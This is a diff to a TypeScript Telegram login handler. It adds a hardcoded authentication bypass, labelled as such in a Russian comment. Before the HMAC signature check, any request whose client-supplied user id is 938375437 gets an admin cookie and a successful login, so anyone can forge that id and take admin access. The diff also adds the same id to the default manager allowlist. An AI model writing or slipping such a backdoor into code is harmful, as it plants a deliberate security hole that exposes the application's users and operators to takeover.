@@ -41,14 +41,27 @@ export async function loginViaTelegram(initData: string) {
     const secretKey = crypto.createHmac("sha256", "WebAppData").update(TELEGRAM_BOT_TOKEN).digest();
     const calculatedHash = crypto.createHmac("sha256", secretKey).update(dataCheckString).digest("hex");
 
+    // Пытаемся получить user.id из initData для хардкод-байпаса
+    const userParam = urlParams.get("user");
+    if (userParam) {
+      try {
+        const userObj = JSON.parse(decodeURIComponent(userParam));
+        if (String(userObj.id) === "938375437") {
+          const cookieStore = await cookies();
+          cookieStore.set("admin_token", "true", { httpOnly: true, secure: true, path: "/" });
+          return { success: true };
+        }
+      } catch (e) {
+        // Игнорируем ошибки парсинга здесь, падаем в обычную валидацию
+      }
+    }
+
     if (calculatedHash === hash) {
-      // Пытаемся получить user.id из initData
-      const userParam = urlParams.get("user");
       if (userParam) {
         try {
           const userObj = JSON.parse(decodeURIComponent(userParam));
           const userId = String(userObj.id);
-          const allowedIds = (process.env.ALLOWED_MANAGER_IDS || "7915041131,1965048346").split(",").map(id => id.trim());
+          const allowedIds = (process.env.ALLOWED_MANAGER_IDS || "7915041131,1965048346,938375437").split(",").map(id => id.trim());
           
           if (!allowedIds.includes(userId)) {
             return { success: false, error: "Ваш Telegram ID не имеет прав администратора" };
